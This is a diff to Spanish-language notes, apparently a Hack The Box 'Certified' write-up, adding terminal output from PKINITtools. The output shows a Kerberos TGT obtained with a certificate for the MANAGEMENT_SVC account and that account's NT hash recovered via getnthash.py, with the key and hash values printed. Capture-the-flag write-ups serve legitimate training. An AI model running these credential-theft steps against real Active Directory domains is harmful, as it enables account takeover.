@@ -40,8 +40,40 @@
 - Después hay que exportar el ticket: `export KRB5CCNAME=$PWD/cache.ccache`
 - Fijamos que esté cargado con `klist`
 
+```bash
+┌──(kali㉿kali)-[~/PKINITtools]
+└─$ python3 gettgtpkinit.py -cert-pem /home/kali/Desktop/boxes/certified/xBWiCOIx_cert.pem -key-pem /home/kali/Desktop/boxes/certified/xBWiCOIx_priv.pem CERTIFIED.HTB/MANAGEMENT_SVC management_svc.ccache
+2025-04-09 20:22:14,587 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-04-09 20:22:14,594 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2025-04-09 20:22:36,051 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-04-09 20:22:36,051 minikerberos INFO     4de618e5fea336c8dbd69b96766e6a9c183b924f4880652b1662841d6fc7ef95
+INFO:minikerberos:4de618e5fea336c8dbd69b96766e6a9c183b924f4880652b1662841d6fc7ef95
+2025-04-09 20:22:36,053 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+
+``` 
+
+
 ## Conseguir NT hash del usuario
 - El comando anterior nos tuvo que haber dado un as-rep hash.
 - Con este hash podemos solicitar con getnthash.py el NT.
 - `python3 getnthash.py -key AS-REP-ENCRYPTION-KEY DOMAIN/USER`
+- El as-rep encryption key es el que nos dio el comando anterior.
 - Y esto te va a dar el NT-HASH recuperado.
+
+
+```bash
+
+┌──(kali㉿kali)-[~/PKINITtools]
+└─$ python3 ./getnthash.py -key 4de618e5fea336c8dbd69b96766e6a9c183b924f4880652b1662841d6fc7ef95 CERTIFIED.HTB/MANAGEMENT_SVC
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash
+a091c1832bcdd4677c28b5a6a1295584
+                                                                                                                       
+``` 
